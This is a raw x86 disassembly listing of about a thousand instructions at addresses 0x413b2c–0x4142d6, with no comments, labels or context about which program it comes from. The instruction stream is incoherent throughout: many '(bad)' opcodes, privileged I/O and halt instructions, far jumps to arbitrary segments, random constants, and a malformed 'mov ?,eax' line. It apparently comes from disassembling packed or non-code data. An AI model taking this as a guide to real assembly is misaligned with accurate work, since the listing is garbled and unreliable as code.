  413b2c:	add    eax,0xceae61c3
  413b31:	cdq    
  413b32:	pop    es
  413b33:	cmp    eax,0x7a523197
  413b38:	jb     0x413aed
  413b3a:	xchg   edx,eax
  413b3b:	loope  0x413b41
  413b3d:	stos   BYTE PTR es:[edi],al
  413b3e:	or     ebx,DWORD PTR [esi]
  413b40:	call   0xbfef:0x5eabb9f1
  413b47:	xor    esp,ebx
  413b49:	(bad)  
  413b4a:	ins    DWORD PTR es:[edi],dx
  413b4b:	fs add eax,0x77c446b7
  413b51:	mov    al,0xf2
  413b53:	in     al,dx
  413b54:	mov    edi,DWORD PTR [edx-0x562f1478]
  413b5a:	enter  0x897f,0xe6
  413b5e:	dec    eax
  413b5f:	mov    edx,0x5f12da4a
  413b64:	jo     0x413b07
  413b66:	xchg   DWORD PTR [ebp-0x4292c7a9],edi
  413b6c:	sbb    ebx,DWORD PTR [eax]
  413b6e:	pop    esp
  413b6f:	lahf   
  413b70:	sub    DWORD PTR [edi],ebp
  413b72:	jecxz  0x413b51
  413b74:	fs sub al,0xf3
  413b77:	pop    ecx
  413b78:	push   ecx
  413b79:	xchg   BYTE PTR [edi],bl
  413b7b:	sub    esi,DWORD PTR [ecx+0x40]
  413b7e:	mov    esi,ss
  413b80:	inc    eax
  413b81:	mov    DWORD PTR [ebp+0x638597dc],esp
  413b87:	repz pop es
  413b89:	and    BYTE PTR [edi],0xa4
  413b8c:	(bad)  
  413b8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b8e:	jmp    0x763f:0x1515052a
  413b95:	mov    dh,0x8d
  413b97:	shl    DWORD PTR [eax],1
  413b99:	out    0xd9,eax
  413b9b:	lods   eax,DWORD PTR gs:[esi]
  413b9d:	aas    
  413b9e:	mov    bh,0x51
  413ba0:	pop    esp
  413ba1:	hlt    
  413ba2:	mov    ebp,0xe1a54360
  413ba7:	mov    al,ds:0xbb5312e6
  413bac:	jecxz  0x413bd7
  413bae:	pushf  
  413baf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413bb0:	retf   0x8dff
  413bb3:	call   0xd9def756
  413bb8:	lock out 0x6a,al
  413bbb:	aam    0xe9
  413bbd:	fistp  WORD PTR [ebp+0x7c]
  413bc0:	out    0x30,al
  413bc2:	sar    DWORD PTR [ecx-0x16cb7f05],cl
  413bc8:	xchg   ecx,eax
  413bc9:	jne    0x413c26
  413bcb:	popa   
  413bcc:	sbb    al,0x95
  413bce:	inc    esp
  413bcf:	mov    ah,0xda
  413bd1:	out    0x14,eax
  413bd3:	(bad)  
  413bd4:	or     esp,ebx
  413bd6:	lahf   
  413bd7:	xor    ch,BYTE PTR ds:0x2cc78410
  413bdd:	inc    ebx
  413bde:	into   
  413bdf:	icebp  
  413be0:	sub    bl,dl
  413be2:	js     0x413bd5
  413be4:	fld    QWORD PTR [esi]
  413be6:	pop    ebp
  413be7:	cld    
  413be8:	inc    ecx
  413be9:	cli    
  413bea:	sbb    DWORD PTR [ebx+edi*1+0x590a8938],edi
  413bf1:	faddp  st(4),st
  413bf3:	push   0xffffffe1
  413bf5:	ja     0x413c70
  413bf7:	jle    0x413bd5
  413bf9:	lahf   
  413bfa:	fsub   DWORD PTR [edi-0x75a92dc7]
  413c00:	popa   
  413c01:	jl     0x413bf2
  413c03:	sbb    ah,0xf
  413c06:	cmc    
  413c07:	and    DWORD PTR [esi-0x3c],ebp
  413c0a:	retf   0x285b
  413c0d:	leave  
  413c0e:	jg     0x413bc4
  413c10:	repnz inc esp
  413c12:	shl    DWORD PTR [ebx],1
  413c14:	jle    0x413c3c
  413c16:	(bad)  
  413c17:	jg     0x413c4a
  413c19:	hlt    
  413c1a:	fwait
  413c1b:	mov    esp,ebp
  413c1d:	ret    
  413c1e:	test   DWORD PTR [eax+0x65],edi
  413c21:	cmp    bl,BYTE PTR [edi]
  413c23:	cmp    DWORD PTR [ecx+0x5807e22c],edx
  413c29:	rcr    dl,cl
  413c2b:	fiadd  WORD PTR [ecx]
  413c2d:	adc    BYTE PTR [esi+0x55f01020],al
  413c33:	lods   al,BYTE PTR ds:[esi]
  413c34:	pop    eax
  413c35:	out    0x61,eax
  413c37:	mov    cl,ch
  413c39:	shr    BYTE PTR [esi+0x188922cd],1
  413c3f:	jnp    0x413be9
  413c41:	dec    ebx
  413c42:	push   cs
  413c43:	xor    ecx,DWORD PTR [ebx+0x1a01320e]
  413c49:	mov    esi,es
  413c4b:	cs pushf 
  413c4d:	mov    ch,0x6
  413c4f:	aas    
  413c50:	xor    cl,BYTE PTR [esi+0x34]
  413c53:	jecxz  0x413c0c
  413c55:	inc    ebx
  413c56:	cmc    
  413c57:	mov    ds:0x1a08baf9,eax
  413c5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c5d:	pop    edi
  413c5e:	mov    ebx,0x3f4a676
  413c63:	dec    edx
  413c64:	xchg   ebp,eax
  413c65:	call   0x98aa:0x468caf7a
  413c6c:	lea    edi,[ebp+0x19]
  413c6f:	sub    BYTE PTR [esi-0x36],cl
  413c72:	rol    DWORD PTR [ebx],1
  413c74:	nop
  413c75:	jle    0x413c6a
  413c77:	sbb    al,0x69
  413c79:	(bad)  
  413c7a:	imul   ebx,DWORD PTR [edi+ecx*1-0x23f90428],0x21ab3d49
  413c85:	fidivr DWORD PTR [ebx+edi*2]
  413c88:	or     ch,ch
  413c8a:	adc    BYTE PTR [ecx+0xce0efcc],al
  413c90:	in     al,0x8c
  413c92:	pop    ds
  413c93:	mov    dh,BYTE PTR [ecx-0x74]
  413c96:	enter  0xc279,0xbc
  413c9a:	sbb    dl,0xb3
  413c9d:	xlat   BYTE PTR ds:[ebx]
  413c9e:	and    BYTE PTR [eax+0x283e1c71],al
  413ca4:	pop    esi
  413ca5:	int3   
  413ca6:	jbe    0x413cae
  413ca8:	mov    dh,BYTE PTR [ebx+0x13]
  413cab:	mov    ch,0x3a
  413cad:	push   esi
  413cae:	lea    ebp,[ecx+0x19]
  413cb1:	inc    ebp
  413cb2:	sub    eax,esi
  413cb4:	ss push edx
  413cb6:	xchg   ebp,eax
  413cb7:	jns    0x413c5c
  413cb9:	push   edx
  413cba:	dec    esp
  413cbb:	jl     0x413ccf
  413cbd:	mov    ebp,DWORD PTR [eax+0x5bf7b2c7]
  413cc3:	cmp    eax,0x3e9d6e2a
  413cc8:	push   ebx
  413cc9:	mov    esp,0x4e55917f
  413cce:	lock gs push ecx
  413cd1:	adc    bh,ch
  413cd3:	sbb    DWORD PTR [ecx],esp
  413cd5:	iret   
  413cd6:	add    BYTE PTR [edi-0x474bf4fa],bl
  413cdc:	ds add esi,esi
  413cdf:	ret    
  413ce0:	mov    bx,0x7b8b
  413ce4:	jbe    0x413c6f
  413ce6:	ror    DWORD PTR [edx+0x5485f9f9],0x2
  413ced:	jp     0x413d51
  413cef:	fcomp  QWORD PTR [edi-0x33f9833]
  413cf5:	xor    eax,0x44aefba
  413cfa:	inc    ebp
  413cfb:	fs xchg edi,eax
  413cfd:	pop    edx
  413cfe:	lock lahf 
  413d00:	lods   eax,DWORD PTR ds:[esi]
  413d01:	imul   ebx,DWORD PTR ds:0xc7fa9843,0xffffffec
  413d08:	sbb    BYTE PTR [esi],dh
  413d0a:	mov    ds:0x3f5edfc4,eax
  413d0f:	leave  
  413d10:	adc    ah,0x3a
  413d13:	mov    dl,0x9b
  413d15:	dec    edx
  413d16:	xchg   edx,eax
  413d17:	in     eax,0xf3
  413d19:	jg     0x413caf
  413d1b:	cld    
  413d1c:	mov    ebp,0x7634c634
  413d21:	into   
  413d22:	leave  
  413d23:	fwait
  413d24:	push   edx
  413d25:	dec    eax
  413d26:	pop    edx
  413d27:	cld    
  413d28:	fimul  WORD PTR [edx]
  413d2a:	ror    BYTE PTR [esi],cl
  413d2c:	mov    al,ds:0xc1fd735b
  413d31:	mov    cl,0xe
  413d33:	outs   dx,DWORD PTR ds:[esi]
  413d34:	mov    DWORD PTR [ebp-0x79],ebp
  413d37:	int    0xb1
  413d39:	adc    edi,DWORD PTR [esi+ebx*8+0x6ae4c3c3]
  413d40:	push   edi
  413d41:	inc    edi
  413d42:	pop    eax
  413d43:	mov    edi,edx
  413d45:	mov    ebp,0x7afce5dd
  413d4a:	sbb    eax,0x37ddfeb8
  413d4f:	push   0xffffffb1
  413d51:	inc    edi
  413d52:	ret    0x328f
  413d55:	or     DWORD PTR [edx],0x76
  413d58:	push   ds
  413d59:	xor    esp,edx
  413d5b:	cs jno 0x413dc0
  413d5e:	mov    al,ds:0x18c760b6
  413d63:	cmp    bl,dh
  413d65:	(bad)  [eax]
  413d67:	imul   eax,DWORD PTR [ebp+0x54],0x4bcd9229
  413d6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d6f:	gs jne 0x413dd1
  413d72:	lods   al,BYTE PTR ds:[esi]
  413d73:	push   ebx
  413d74:	inc    esi
  413d75:	jbe    0x413d26
  413d77:	xlat   BYTE PTR ds:[ebx]
  413d78:	aam    0xf6
  413d7a:	push   es
  413d7b:	dec    esp
  413d7c:	dec    edx
  413d7d:	arpl   WORD PTR [esi],sp
  413d7f:	push   es
  413d80:	cli    
  413d81:	inc    edi
  413d82:	rol    DWORD PTR [eax+ebp*8+0x51228b49],1
  413d89:	push   ds
  413d8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d8b:	push   ebp
  413d8c:	mov    ebx,0x312d9ee8
  413d91:	dec    esi
  413d92:	mov    ebx,0xb63553f
  413d97:	iret   
  413d98:	aad    0xc3
  413d9a:	in     al,0xa4
  413d9c:	sbb    al,0x11
  413d9e:	jle    0x413d92
  413da0:	(bad)  
  413da1:	xchg   edx,eax
  413da2:	je     0x413d86
  413da4:	(bad)  
  413da5:	mov    esi,0x8f45bc73
  413daa:	ss ret 0xeac5
  413dae:	jbe    0x413d90
  413db0:	or     al,BYTE PTR [esi-0x4e1971f4]
  413db6:	rcl    DWORD PTR [edx],cl
  413db8:	dec    ebx
  413db9:	add    DWORD PTR [edx+0x4adab77d],eax
  413dbf:	mov    DWORD PTR [ebp+0x6d],ebp
  413dc2:	xor    al,0x5f
  413dc4:	(bad)  
  413dc5:	(bad)  
  413dc6:	call   0xaab2af0c
  413dcb:	popf   
  413dcc:	ds inc ebx
  413dce:	push   ebx
  413dcf:	fwait
  413dd0:	mov    dh,0xd
  413dd2:	pop    eax
  413dd3:	push   esp
  413dd4:	mov    bl,0xd3
  413dd6:	outs   dx,DWORD PTR ds:[esi]
  413dd7:	xchg   esi,eax
  413dd8:	cli    
  413dd9:	sub    ah,BYTE PTR [eax-0x49]
  413ddc:	dec    eax
  413ddd:	ret    0x526d
  413de0:	je     0x413df1
  413de2:	adc    ebx,ebx
  413de4:	mov    ds:0x6193d49f,al
  413de9:	dec    eax
  413dea:	fdivr  QWORD PTR [eax+0x75]
  413ded:	sub    bl,ah
  413def:	inc    ebx
  413df0:	or     bl,BYTE PTR ds:0x2f0d0e3
  413df6:	std    
  413df7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413df8:	lods   al,BYTE PTR ds:[esi]
  413df9:	mov    DWORD PTR ds:0x94d95fd5,esi
  413dff:	icebp  
  413e00:	push   ecx
  413e01:	jae    0x413d9a
  413e03:	inc    ebx
  413e04:	jae    0x413e0b
  413e06:	imul   edx,DWORD PTR [ecx-0xb5cb595],0xffffffdb
  413e0d:	dec    ecx
  413e0e:	jne    0x413dac
  413e10:	js     0x413e5d
  413e12:	hlt    
  413e13:	or     BYTE PTR [eax+0x57],ch
  413e16:	out    dx,eax
  413e17:	dec    ebp
  413e18:	cmp    al,ch
  413e1a:	popf   
  413e1b:	push   edi
  413e1c:	push   ss
  413e1d:	xchg   ebp,eax
  413e1e:	(bad)  
  413e1f:	icebp  
  413e20:	in     al,dx
  413e21:	mov    edi,0xd30bba5d
  413e26:	pop    esi
  413e27:	push   ebp
  413e28:	mov    bh,0xaf
  413e2a:	jg     0x413db5
  413e2c:	jge    0x413ddf
  413e2e:	mov    dh,0xaa
  413e30:	into   
  413e31:	imul   esi,DWORD PTR [ebp+edi*2+0x456cc03f],0xc08e3a8
  413e3c:	jp     0x413e97
  413e3e:	daa    
  413e3f:	jp     0x413e62
  413e41:	adc    ebp,eax
  413e43:	and    ah,BYTE PTR [edx+0x60]
  413e46:	mov    dh,0x45
  413e48:	addr16 dec esi
  413e4a:	dec    DWORD PTR [ebx+0x35]
  413e4d:	add    dh,BYTE PTR [ecx+eiz*8+0x26c457c5]
  413e54:	in     eax,0x81
  413e56:	inc    edx
  413e57:	jmp    0x2e016f48
  413e5c:	push   edx
  413e5d:	ins    BYTE PTR es:[edi],dx
  413e5e:	(bad)  
  413e5f:	sub    al,BYTE PTR ds:0x4988cc73
  413e65:	shr    DWORD PTR [ebx],1
  413e67:	push   eax
  413e68:	sub    dl,al
  413e6a:	out    dx,eax
  413e6b:	imul   esi,DWORD PTR [ecx+0x5e],0x21700cf4
  413e72:	loope  0x413eae
  413e74:	adc    ebp,0x46
  413e77:	clc    
  413e78:	sbb    BYTE PTR [edi],cl
  413e7a:	les    ecx,FWORD PTR [ebp+eax*2-0x85a1857]
  413e81:	ds push 0x15
  413e84:	xor    DWORD PTR [edx],eax
  413e86:	inc    esp
  413e87:	stos   BYTE PTR es:[di],al
  413e89:	imul   esp
  413e8b:	das    
  413e8c:	aad    0x84
  413e8e:	xchg   edi,eax
  413e8f:	mov    cl,0x58
  413e91:	mov    eax,ds:0x56034432
  413e96:	or     esp,DWORD PTR [edx]
  413e98:	imul   eax,DWORD PTR [edi+esi*4-0x54],0xc3945b8
  413ea0:	lods   eax,DWORD PTR ds:[esi]
  413ea1:	and    BYTE PTR [eax+ebx*1],bl
  413ea4:	test   eax,0x9f2dda9f
  413ea9:	fisub  DWORD PTR gs:[bx]
  413ead:	cmp    DWORD PTR [eax+0x462d93f9],edi
  413eb3:	pop    edx
  413eb4:	mov    ebp,0xf7fdca3f
  413eb9:	mov    bl,0x20
  413ebb:	fs call 0xf7aa2222
  413ec1:	popa   
  413ec2:	add    al,0xe1
  413ec4:	pop    ebp
  413ec5:	jecxz  0x413f3e
  413ec7:	out    0x42,al
  413ec9:	and    DWORD PTR ds:0xe3a512e8,edi
  413ecf:	cmp    BYTE PTR [edi+ebx*1-0x41],bl
  413ed3:	retf   
  413ed4:	mov    dl,0xb7
  413ed6:	mov    WORD PTR [edi+0x57],ss
  413ed9:	int    0xaf
  413edb:	call   0x9e4:0xcbea028d
  413ee2:	xor    eax,0x9fc75982
  413ee7:	cmp    edx,DWORD PTR [edi+0x527bf81f]
  413eed:	jae    0x413ec0
  413eef:	pop    ecx
  413ef0:	and    al,0x7a
  413ef2:	mov    ah,0x7
  413ef4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ef5:	inc    esi
  413ef6:	jb     0x413ebe
  413ef8:	fadd   QWORD PTR [ebx]
  413efa:	into   
  413efb:	leave  
  413efc:	or     cl,0x5d
  413eff:	loop   0x413f15
  413f01:	inc    edi
  413f02:	dec    esi
  413f03:	stos   BYTE PTR es:[edi],al
  413f04:	sub    ah,dl
  413f06:	outs   dx,DWORD PTR ds:[esi]
  413f07:	in     eax,dx
  413f08:	xchg   edx,eax
  413f09:	jle    0x413f19
  413f0b:	mov    eax,ds:0x9e9c4eb8
  413f10:	add    BYTE PTR [edi+ebx*2],cl
  413f13:	mov    bh,0x58
  413f15:	out    dx,al
  413f16:	add    dl,dl
  413f18:	fsubr  st,st(0)
  413f1a:	sbb    eax,0x41f518b2
  413f1f:	ja     0x413f2b
  413f21:	or     al,0x8c
  413f23:	push   edx
  413f24:	xchg   BYTE PTR [ebx+0x3068b1f8],bl
  413f2a:	push   esp
  413f2b:	nop
  413f2c:	(bad)  
  413f2d:	mov    edi,0xcc01f7f7
  413f32:	(bad)  
  413f33:	fdivrp st(3),st
  413f35:	jno    0x413eea
  413f37:	xchg   ecx,eax
  413f38:	stc    
  413f39:	sbb    eax,DWORD PTR [eax+0x3f34c9ce]
  413f3f:	aad    0xd2
  413f41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f42:	(bad)  
  413f43:	mov    edx,0x4f5c9aa5
  413f48:	inc    edi
  413f49:	cmc    
  413f4a:	and    al,0xdb
  413f4c:	mov    ds:0xd21fde00,al
  413f51:	mov    cl,0x5d
  413f53:	push   cs
  413f54:	dec    eax
  413f55:	call   0x2516:0xc8e64f37
  413f5c:	sub    ebp,DWORD PTR [edx-0x4a64b83f]
  413f62:	sbb    al,0x8b
  413f64:	call   0x3ba03faf
  413f69:	xchg   ecx,eax
  413f6a:	mov    al,0x9a
  413f6c:	dec    ebp
  413f6d:	push   ss
  413f6e:	and    ecx,DWORD PTR [esp+ebx*4]
  413f71:	jns    0x413f56
  413f73:	aad    0x1
  413f75:	es xor al,0x1f
  413f78:	fsubr  DWORD PTR [ebx-0x31]
  413f7b:	call   0xb56fcf28
  413f80:	(bad)  
  413f81:	mov    eax,0x1764ebb2
  413f86:	mov    ?,eax
  413f88:	cdq    
  413f89:	jnp    0x413f1e
  413f8b:	and    BYTE PTR [edx-0x5b],ch
  413f8e:	rcl    BYTE PTR [ebx],0x8a
  413f91:	icebp  
  413f92:	xor    ebp,0x4710ccc4
  413f98:	popf   
  413f99:	repz hlt 
  413f9b:	shl    edx,cl
  413f9d:	arpl   WORD PTR [ebp+0xa9f2b6a],si
  413fa3:	jl     0x413f4d
  413fa5:	scas   al,BYTE PTR es:[edi]
  413fa6:	mov    ecx,0x85be6a9
  413fab:	mov    eax,0x1e1a7a98
  413fb0:	outs   dx,DWORD PTR ds:[esi]
  413fb1:	js     0x413f41
  413fb3:	dec    ecx
  413fb4:	push   ebx
  413fb5:	inc    eax
  413fb6:	sbb    al,0x1f
  413fb8:	or     esi,DWORD PTR [ecx+0x47]
  413fbb:	frstor [eax-0x29]
  413fbe:	xor    BYTE PTR [eax+0x42f0c90c],dh
  413fc4:	or     BYTE PTR [ebx+eiz*2],ah
  413fc7:	ja     0x413f75
  413fc9:	mov    eax,0xa494e3a0
  413fce:	mov    esi,0x89bacd7
  413fd3:	push   edx
  413fd4:	dec    esi
  413fd5:	dec    edi
  413fd6:	rcr    DWORD PTR [edi],1
  413fd8:	or     BYTE PTR [ebp+0xf968c63],ch
  413fde:	jp     0x41403f
  413fe0:	cmp    esi,DWORD PTR [edx+ecx*4]
  413fe3:	fdivr  QWORD PTR [edx-0x122cc512]
  413fe9:	scas   al,BYTE PTR es:[edi]
  413fea:	pushf  
  413feb:	xor    eax,0xb4904d07
  413ff0:	aas    
  413ff1:	scas   al,BYTE PTR es:[edi]
  413ff2:	ficom  DWORD PTR [ebx]
  413ff4:	cmp    cl,dh
  413ff6:	jmp    0xf899d6ab
  413ffb:	test   DWORD PTR [edi+0x4f],esi
  413ffe:	aaa    
  413fff:	test   BYTE PTR ds:0xeadd4e31,0x2a
  414006:	jmp    0x41405e
  414008:	dec    edi
  414009:	lahf   
  41400a:	and    BYTE PTR [esi+0x21f7e5ec],dl
  414010:	into   
  414011:	push   esi
  414012:	fld    DWORD PTR [edi-0x29]
  414015:	in     al,dx
  414016:	jmp    0x3186:0x8bc9a040
  41401d:	lds    esp,FWORD PTR [edi+ebx*2]
  414020:	mov    esi,0x723b7ba8
  414025:	into   
  414026:	lea    esp,[edi+ebx*1-0x17]
  41402a:	sub    al,0x2c
  41402c:	mov    ah,0x6
  41402e:	jnp    0x41406d
  414030:	pop    ebx
  414031:	aas    
  414032:	daa    
  414033:	xor    ch,bh
  414035:	mov    ebx,ecx
  414037:	jmp    0xb4e4:0x26ca587b
  41403e:	sbb    ebp,eax
  414040:	stc    
  414041:	xor    ebp,DWORD PTR [ebx+0x5c]
  414044:	mov    BYTE PTR [edx+0x1f7c4d5b],ch
  41404a:	(bad)  
  41404b:	push   esp
  41404c:	mov    bl,0xd
  41404e:	fild   WORD PTR [edx]
  414050:	cmp    DWORD PTR [ebp+0x12],esp
  414053:	dec    eax
  414054:	push   0xffffffcb
  414056:	test   BYTE PTR [ecx+0x32],cl
  414059:	call   FWORD PTR [ebx-0x43cf1ab6]
  41405f:	pop    ebx
  414060:	jge    0x4140d2
  414062:	xor    dh,al
  414064:	mov    ebp,0xb04e1880
  414069:	enter  0x9b9a,0x40
  41406d:	or     BYTE PTR [ecx+eiz*4-0x7ead007b],0x18
  414075:	jecxz  0x414098
  414077:	jmp    0x61b:0x458c01f3
  41407e:	push   ebp
  41407f:	fistp  WORD PTR [edi]
  414081:	pop    esi
  414082:	cmp    al,0x42
  414084:	out    0xda,eax
  414086:	adc    bh,dl
  414088:	sbb    edx,DWORD PTR [edx+0x43d9f2e6]
  41408e:	call   0xc52fca9
  414093:	hlt    
  414094:	jg     0x414050
  414096:	dec    ecx
  414097:	mov    esp,0x8965a347
  41409c:	mov    ds,WORD PTR [esi+0x54]
  41409f:	call   0x1b64:0x21dd0c15
  4140a6:	xor    eax,0xe98f88f9
  4140ab:	test   eax,0x1bf58f7
  4140b0:	repz push es
  4140b2:	jae    0x41405e
  4140b4:	cli    
  4140b5:	ja     0x414135
  4140b7:	inc    esi
  4140b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4140b9:	jecxz  0x414050
  4140bb:	xchg   edi,eax
  4140bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4140bd:	xor    bl,BYTE PTR [edi-0x6d]
  4140c0:	int3   
  4140c1:	xchg   esi,eax
  4140c2:	mov    bh,0x33
  4140c4:	(bad)  
  4140c5:	inc    edi
  4140c6:	xchg   edx,eax
  4140c7:	addr16 ret 
  4140c9:	gs dec ebx
  4140cb:	lods   al,BYTE PTR ds:[esi]
  4140cc:	add    edi,DWORD PTR [esi+0x1def743f]
  4140d2:	sub    DWORD PTR [ecx+0x36],ebp
  4140d5:	pop    esp
  4140d6:	fs cld 
  4140d8:	aam    0xb3
  4140da:	sbb    dl,bl
  4140dc:	sbb    BYTE PTR [eax],0x7d
  4140df:	in     eax,0xbd
  4140e1:	jne    0x4140bf
  4140e3:	retf   
  4140e4:	jmp    0x4140da
  4140e6:	adc    al,0x34
  4140e8:	add    ah,0x15
  4140eb:	inc    edx
  4140ec:	and    DWORD PTR [ecx+0x6c],esp
  4140ef:	xchg   BYTE PTR [edx+eiz*1],cl
  4140f2:	rcl    BYTE PTR ss:[ebp-0x59f2ca24],1
  4140f9:	xor    dh,dh
  4140fb:	xor    DWORD PTR [ecx],edi
  4140fd:	test   al,0x8c
  4140ff:	add    BYTE PTR [eax+0x32],bl
  414102:	sar    ecx,cl
  414104:	ret    0x4a7c
  414107:	push   esi
  414108:	sub    esp,edi
  41410a:	mov    bh,0x4f
  41410c:	stos   DWORD PTR es:[edi],eax
  41410d:	aad    0x86
  41410f:	dec    ecx
  414110:	fwait
  414111:	shl    DWORD PTR [ebp+0x58],0x81
  414115:	das    
  414116:	hlt    
  414117:	mov    ch,0xee
  414119:	(bad)  
  41411a:	adc    DWORD PTR fs:[ebx-0x14],esp
  41411e:	(bad)  
  41411f:	fsubr  DWORD PTR [esi]
  414121:	ds cmp al,0xba
  414124:	(bad)  
  414125:	or     eax,0x2b94d6fc
  41412a:	(bad)  
  41412c:	loope  0x4140df
  41412e:	gs mov esi,0x89a05427
  414134:	inc    ebp
  414135:	inc    edi
  414136:	xor    bh,BYTE PTR [eax+0x2a0861c7]
  41413c:	inc    ebp
  41413d:	xlat   BYTE PTR ds:[ebx]
  41413e:	retf   0xa8ad
  414141:	aaa    
  414142:	cli    
  414143:	cmovne edi,DWORD PTR [edx]
  414146:	cmp    eax,0x89ea9be2
  41414b:	outs   dx,BYTE PTR ds:[esi]
  41414c:	leave  
  41414d:	pop    edx
  41414e:	inc    ebx
  41414f:	or     BYTE PTR [eax-0x31a04ee0],al
  414155:	xor    BYTE PTR [edi+0x7f],dl
  414158:	aam    0xb
  41415a:	cdq    
  41415b:	pop    esi
  41415c:	fild   DWORD PTR [esi-0x46]
  41415f:	test   BYTE PTR ds:0xe72ae4c,bh
  414165:	aam    0xbc
  414167:	hlt    
  414168:	in     eax,dx
  414169:	push   cs
  41416a:	(bad)  
  41416b:	aas    
  41416c:	adc    al,0x44
  41416e:	clc    
  41416f:	stos   DWORD PTR es:[edi],eax
  414170:	jle    0x4141c7
  414172:	mov    ebp,0xdfdc0c1
  414177:	inc    edi
  414178:	cmp    DWORD PTR [edi],edi
  41417a:	fwait
  41417b:	es je  0x4141c4
  41417e:	inc    edx
  41417f:	jecxz  0x414149
  414181:	adc    DWORD PTR [edi+esi*8+0xfe7273a],edx
  414188:	into   
  414189:	cwde   
  41418a:	cmp    BYTE PTR [eax],ah
  41418c:	sub    al,0x48
  41418e:	dec    edx
  41418f:	push   0x1a
  414191:	pop    edi
  414192:	push   edi
  414193:	and    edx,DWORD PTR [ebx-0x1c3250d4]
  414199:	fs inc esp
  41419b:	sbb    al,0xe1
  41419d:	mov    BYTE PTR [ebx+0x36c2d775],ch
  4141a3:	(bad)  
  4141a4:	in     al,dx
  4141a5:	in     eax,0x36
  4141a7:	sbb    al,0x3c
  4141a9:	sub    eax,0x4c119db0
  4141ae:	xchg   esi,eax
  4141af:	(bad)  [esi+0x39]
  4141b2:	mov    dh,0xc3
  4141b4:	xor    bh,BYTE PTR [ecx]
  4141b6:	sub    al,ah
  4141b8:	data16 add al,0xdc
  4141bb:	fadd   DWORD PTR [esi-0x6]
  4141be:	cmc    
  4141bf:	sbb    al,0xf2
  4141c1:	sbb    al,0x7a
  4141c3:	or     DWORD PTR [eax],ecx
  4141c5:	adc    eax,eax
  4141c7:	cdq    
  4141c8:	hlt    
  4141c9:	(bad)  
  4141ca:	push   edx
  4141cb:	mov    al,0xc
  4141cd:	dec    ecx
  4141ce:	and    BYTE PTR ds:[ebp+0x31ee8d81],dl
  4141d5:	xchg   esp,eax
  4141d6:	imul   esi,DWORD PTR [esi+0x79],0x25
  4141da:	or     DWORD PTR [eax+0x59783fff],0xf0d79504
  4141e4:	push   ebp
  4141e5:	xchg   esi,eax
  4141e6:	xchg   ecx,eax
  4141e7:	ja     0x4141c3
  4141e9:	leave  
  4141ea:	les    ecx,FWORD PTR [ebx+edx*4]
  4141ed:	xchg   esp,edx
  4141ef:	mov    edx,0x3ecdc7f7
  4141f4:	jp     0x414237
  4141f6:	(bad)
  4141f9:	int    0x9b
  4141fb:	sbb    dh,al
  4141fd:	mov    edx,0x354a38dd
  414202:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414203:	sub    al,0xee
  414205:	inc    ebx
  414206:	pop    ebp
  414207:	loop   0x414207
  414209:	xor    edx,DWORD PTR [edi-0x580ebf62]
  41420f:	pop    eax
  414210:	push   ds
  414211:	ret    0xa978
  414214:	add    bl,BYTE PTR [edi]
  414216:	inc    esi
  414217:	jl     0x41422f
  414219:	(bad)  
  41421a:	pop    ss
  41421b:	sub    al,0x6d
  41421d:	fld    TBYTE PTR [esi-0x1d582d6b]
  414223:	mov    eax,0xf3c0eb75
  414228:	cmp    DWORD PTR [ebp-0x3f],esi
  41422b:	and    DWORD PTR [edx-0x7652ec43],ebx
  414231:	sahf   
  414232:	jnp    0x41429d
  414234:	ja     0x4142ac
  414236:	add    BYTE PTR [edi],ah
  414238:	or     esi,edx
  41423a:	das    
  41423b:	stos   BYTE PTR es:[edi],al
  41423c:	mov    bl,0x33
  41423e:	or     ebx,edi
  414240:	add    BYTE PTR [edi-0x644795f],bh
  414246:	or     BYTE PTR [ebx-0x5b],ch
  414249:	jns    0x414266
  41424b:	rcl    cl,0x5a
  41424e:	or     al,0xce
  414250:	scas   eax,DWORD PTR es:[edi]
  414251:	jge    0x414248
  414253:	xchg   edi,eax
  414254:	mov    ch,0x2d
  414256:	mov    ebx,0x5bda4a54
  41425b:	hlt    
  41425c:	sbb    eax,0x4edf50b2
  414261:	gs jnp 0x414267
  414264:	lods   eax,DWORD PTR ds:[esi]
  414265:	cmp    DWORD PTR [ecx+ecx*1-0x19],esi
  414269:	inc    ecx
  41426a:	mov    dl,0xb5
  41426c:	aad    0xfb
  41426e:	js     0x414213
  414270:	pop    esp
  414271:	pusha  
  414272:	or     esi,DWORD PTR [ecx]
  414274:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414275:	xchg   BYTE PTR [edx+ebp*4-0xdb6cb7e],bh
  41427c:	sub    al,0xa4
  41427e:	xlat   BYTE PTR ds:[ebx]
  41427f:	mov    esi,0x86eb570
  414284:	sahf   
  414285:	ins    DWORD PTR es:[edi],dx
  414286:	or     eax,0xda36bd8b
  41428b:	pusha  
  41428c:	or     DWORD PTR [esp+edi*2-0x3fd2afdb],edi
  414293:	pop    ecx
  414294:	cmp    esi,esi
  414296:	jg     0x4142cd
  414298:	jmp    0xa207:0x21ff64a8
  41429f:	popa   
  4142a0:	cmp    BYTE PTR [esi+ebx*1],0x45
  4142a4:	xchg   BYTE PTR [edx+eax*4+0x17],dl
  4142a8:	cmp    al,dl
  4142aa:	push   eax
  4142ab:	adc    al,0xac
  4142ad:	xchg   esp,eax
  4142ae:	mov    ecx,0x9aa2e64
  4142b3:	pusha  
  4142b4:	xchg   edx,eax
  4142b5:	ds ss pop es
  4142b8:	push   ds
  4142b9:	jg     0x41426b
  4142bb:	daa    
  4142bc:	gs daa 
  4142be:	or     DWORD PTR [esi-0x6a],ecx
  4142c1:	and    eax,0xa1f26335
  4142c6:	jns    0x4142c4
  4142c8:	inc    esp
  4142c9:	shr    BYTE PTR [edi-0x30],cl
  4142cc:	call   0xe5b6aa30
  4142d1:	push   esp
  4142d2:	push   esp
  4142d3:	arpl   WORD PTR [ecx],sp
  4142d5:	lahf   
  4142d6:	fisub  WORD PTR [ecx+eiz*2]
